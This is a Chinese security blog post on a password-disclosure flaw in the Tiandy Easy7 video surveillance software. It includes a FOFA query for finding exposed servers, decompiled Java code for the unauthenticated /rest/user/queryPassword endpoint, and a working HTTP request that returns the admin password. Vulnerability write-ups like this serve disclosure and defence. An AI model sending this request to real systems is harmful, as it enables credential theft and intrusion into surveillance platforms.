---
title: "天地伟业Easy7 queryPassword 信息泄露漏洞"
source: https://mrxn.net/jswz/easy7-user-queryPassword-data-leak.html
asset_dir: assets/天地伟业easy7-querypassword-信息泄露漏洞
---

# 天地伟业Easy7 queryPassword 信息泄露漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/2/8 08:55
- 324浏览
- [0评论](#comment)
- 15分钟阅读

深入探索

计算机安全

安全

rest

---

# 漏洞简介

天地伟业Easy7是一款用于视频监控管理的[软件](#)系统。

漏洞扫描服务

该系统中存在一个[信息泄露](https://mrxn.net/tag/%E6%B3%84%E9%9C%B2)漏洞，攻击者可以通过访问特定的URL路径/Easy7/rest/user/queryPassword获取系统用户信息。攻击者可通过构造特定请求读取系统登录密码。

# 影响版本

# fofa语法

> body="/Easy7/apps/WebService/LogIn.jsp" || body="Easy7/VideoLib.EXE" || body="/Easy7/index.html" || (body="<img src=\"./images/ico/Easy7\_logo\_transparent.png") && title="平台"

# 漏洞分析

首先，该系统基于Spring 3.0，比较古老且WEB-INF/web.xml里没有配置任何filter进行权限校验，因此绝大部分接口都是可以直接访问的。

物流软件安全

再来看本次的[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)接口 `/rest/user/queryPassword` 实现逻辑

```
@Controller
@RequestMapping({"/user"})
public class CLS_REST_User {
    @Resource(
        name = "boUser"
    )
    private CLS_BO_User boUser;

    @RequestMapping({"/queryPassword"})
    public void queryPassword(HttpServletRequest req, HttpServletResponse resp, String userName) throws Exception {
        resp.getWriter().print(JSONObject.fromObject(this.boUser.queryPassword(userName)));
    }
```

深入探索

JSON处理工具

企业安全咨询

漏洞修复方案

跟进`queryPassword`方法

```
@Transactional
public CLS_VO_Result queryPassword(String userName) {
    CLS_VO_Result result = new CLS_VO_Result();
    if (null != userName && !"".equals(userName)) {
        result.setContent(this.daoUser.getUserInfoByUsername(userName).getSPassword());
        result.setRet(0);
        return result;
    } else {
        result.setRet(-7);
        return result;
    }
}
```

继续跟进`getUserInfoByUsername`方法看下

[![天地伟业Easy7 queryPassword 信息泄露漏洞](images/img-001-32ffd763db99.webp)](https://image.mrxn.net/06e261d56245480faf100781dc6bbcac.webp)

直接将用户传递过来的参数userName带入数据库查询并返回查询到的密码信息。

计算机科学

# 漏洞复现

```
POST /Easy7/rest/user/queryPassword HTTP/1.1
Host: easy7.mrxn.net
Content-Type: application/x-www-form-urlencoded

userName=admin
```

深入探索

网络安全培训

防火墙软件

VPN服务

[![天地伟业Easy7 queryPassword 信息泄露漏洞](images/img-002-7729f763d0ec.webp)](https://image.mrxn.net/4b4279bb9bbc47daa5bc509f7fd07553.webp)

部分版本密码是明文

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#泄露](https://mrxn.net/tag/%E6%B3%84%E9%9C%B2)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
